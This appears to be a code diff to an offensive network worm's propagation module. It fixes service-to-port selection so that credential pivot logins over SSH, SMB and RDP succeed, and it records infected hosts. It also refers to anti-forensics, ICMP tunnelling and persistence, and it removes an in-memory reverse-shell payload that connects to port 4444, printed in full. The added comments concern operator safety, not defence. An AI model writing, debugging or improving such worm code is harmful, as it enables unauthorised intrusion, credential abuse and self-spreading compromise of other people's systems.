@@ -1,7 +1,7 @@
 import os
 import time
 from datetime import datetime
-from typing import Dict
+from typing import Dict, Optional
 
 from .module_imports import logger
 from .standalone import get_local_ip
@@ -39,6 +39,25 @@ class WormCorePropagation:
             self.rl_agent.save(checkpoint_path)
         except Exception as e:
             logger.debug(f"Failed to save online checkpoint: {e}")
+
+    # Canonical service -> port mapping. Previously the login used ports[0]
+    # (the FIRST open port, e.g. HTTP) for whichever service was chosen
+    # (e.g. SSH), guaranteeing failure on multi-port hosts.
+    _SERVICE_PORTS = {
+        "ssh": (22, 2222, 2200, 2022),
+        "smb": (445,),
+        "rdp": (3389,),
+        "http": (80, 8080, 443),
+    }
+
+    @classmethod
+    def _service_port(cls, service: str, ports) -> Optional[int]:
+        """Pick the correct port for a service from the open-port list."""
+        preferred = cls._SERVICE_PORTS.get(service, ())
+        for candidate in preferred:
+            if candidate in ports:
+                return candidate
+        return None
 
     def _credential_pivot_cycle(self):
         if not self.cred_manager or not self.scan_results:
@@ -102,18 +121,21 @@ class WormCorePropagation:
                 if not service:
                     continue
 
-                logger.debug(f"Pivot: {username} -> {ip} ({service})")
+                service_port = self._service_port(service, ports)
+                if service_port is None:
+                    continue
+
+                logger.debug(f"Pivot: {username} -> {ip}:{service_port} ({service})")
 
                 if self.dry_run:
                     continue
 
                 success = self._try_service_login(
-                    ip, ports[0] if ports else 22, service, username, password
+                    ip, service_port, service, username, password
                 )
                 if success:
                     logger.success(f"Pivot success: {username} -> {ip} ({service})")
-                    if ip not in self.infected_hosts:
-                        self.infected_hosts.add(ip)
+                    if self.check_and_add_infected(ip):
                         self.stats["infections"] += 1
                         if self.knowledge_graph:
                             self.knowledge_graph.mark_infected(ip, f"pivot_{service}")
@@ -177,6 +199,19 @@ class WormCorePropagation:
                 )
 
     def _post_exploitation_cleanup(self, ip: str, target: Dict):
+        """Post-exploitation bookkeeping for a compromised host.
+
+        SECURITY NOTE (operator safety): this function MUST NOT execute any
+        payload on the local machine. It previously ran a live reverse-shell
+        stub in-memory on the operator host with the VICTIM ip as connect
+        target -- code that made no sense operationally and endangered the
+        operator. Remote payload delivery belongs to the agent_controller
+        task queue, never to local execution.
+        """
+        if self.dry_run:
+            logger.debug(f"[DRY RUN] Skipping post-exploitation cleanup for {ip}")
+            return
+
         os_guess = target.get("os_guess", "Unknown").lower()
 
         if "windows" in os_guess:
@@ -207,14 +242,8 @@ class WormCorePropagation:
         except Exception as e:
             logger.debug(f"Anti-forensics failed on {ip}: {e}")
 
-        if self.memory_execution:
-            try:
-                payload = f"import socket,subprocess,shlex; s=socket.socket(); s.connect(('{ip}', 4444)); cmd=s.recv(4096).decode(); s.close(); subprocess.call(shlex.split(cmd))"
-                success = self.memory_execution.execute_in_memory(payload.encode())
-                if success:
-                    logger.debug(f"In-memory payload executed on {ip}")
-            except Exception as e:
-                logger.debug(f"Memory execution failed on {ip}: {e}")
+        # NOTE: local in-memory payload execution was REMOVED. It ran a live
+        # reverse-shell stub on the operator machine (see docstring).
 
         if self.direct_syscalls:
             try:
@@ -317,7 +346,10 @@ class WormCorePropagation:
             except Exception as e:
                 logger.warning(f"ICMP Tunnel listener failed: {e}")
 
-        if self.local_persistence:
+        if self.local_persistence and not self.dry_run:
+            # Local persistence on the OPERATOR machine is a real, invasive
+            # side effect: never performed during --dry-run. (Previously cron/
+            # systemd/registry persistence was installed even in dry-run.)
             try:
                 from .module_imports import WORM_FILE_PATH
 
@@ -328,7 +360,7 @@ class WormCorePropagation:
             except Exception as e:
                 logger.debug(f"Local persistence failed: {e}")
 
-        if self.advanced_persistence:
+        if self.advanced_persistence and not self.dry_run:
             try:
                 from .module_imports import WORM_FILE_PATH
 
